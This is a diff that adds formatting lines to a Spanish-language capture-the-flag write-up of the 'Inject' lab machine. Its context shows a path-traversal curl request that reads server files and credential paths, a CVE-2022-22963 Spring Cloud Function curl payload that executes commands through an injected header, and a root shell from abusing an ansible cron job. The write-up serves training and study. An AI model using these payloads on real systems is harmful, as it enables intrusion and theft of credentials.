@@ -25,6 +25,7 @@ PING 10.10.11.204 (10.10.11.204) 56(84) bytes of data.
 1 packets transmitted, 1 received, 0% packet loss, time 0ms
 rtt min/avg/max/mdev = 88.911/88.911/88.911/0.000 ms
 ```
+{: .nolineno }
 
 Ahora vamos a conocer los puertos que tiene abiertos la máquina, haciendo uso de la herramienta `Nmap` 
 
@@ -51,6 +52,7 @@ Read data files from: /usr/bin/../share/nmap
 Nmap done: 1 IP address (1 host up) scanned in 13.80 seconds
            Raw packets sent: 67554 (2.972MB) | Rcvd: 67435 (2.697MB)
 ```
+{: .nolineno }
 
 Vemos que hay dos puertos abiertos, corriendo `SSH` por el puerto `22` y un servicio `HTTP` por el puerto `8080`
 
@@ -75,6 +77,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 11.23 seconds
 ```
+{: .nolineno }
 
 ## Análisis de Vulnerabilidades
 
@@ -87,6 +90,7 @@ Podemos ver que se está cargando la imagen de esta manera:
 ```html
 http://10.10.11.204:8080/show_image?img=Wallpaper.jpg
 ```
+{: .nolineno }
 
 Lo que nos hace pensar en un `Local File Inclusion (LFI)`
 
@@ -101,6 +105,7 @@ resources
 uploads
 curl: (18) transfer closed with 4073 bytes remaining to read
 ```
+{: .nolineno }
 
 Indagando un poco en la máquina, encontramos el archivo `pom.xml` en la ruta `http://10.10.11.204:8080/show_image?img=../../../../../../var/www/WebApp/pom.xml`
 
@@ -119,6 +124,7 @@ También encotramos un archivo de configuración, con credenciales en texto clar
 ❯ curl -X GET  'http://10.10.11.204:8080/show_image?img=../../../../../../home/frank/.m2'
 settings.xml
 ```
+{: .nolineno }
 
 ![Settings.xml](/assets/img/commons/Inject/settings.xml.png)
 
@@ -132,6 +138,7 @@ Encontramos la vulnerabilidad [CVE-2022-22963](https://github.com/J0ey17/CVE-202
 ```bash
 curl -s -X POST "http://10.10.11.204:8080/functionRouter" -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("ping -c 1 {Ip Attack}")' -d '.'
 ```
+{: .nolineno }
 
 
 
@@ -185,6 +192,7 @@ Con el fin de ver este proceso:
 
 /usr/bin/python3 /usr/bin/ansible-playbook /opt/automation/tasks/playbook_1.yml
 ```
+{: .nolineno }
 
 Vemos que está ejecutando todo lo que encuentre en `/opt/automation/tasks/\*.yml`
 
@@ -215,5 +223,6 @@ bash-5.0# whoami
 root
 bash-5.0# 
 ```
+{: .nolineno }
 
 ![Inject Pwned!](/assets/img/commons/Inject/InjectPwned.png)
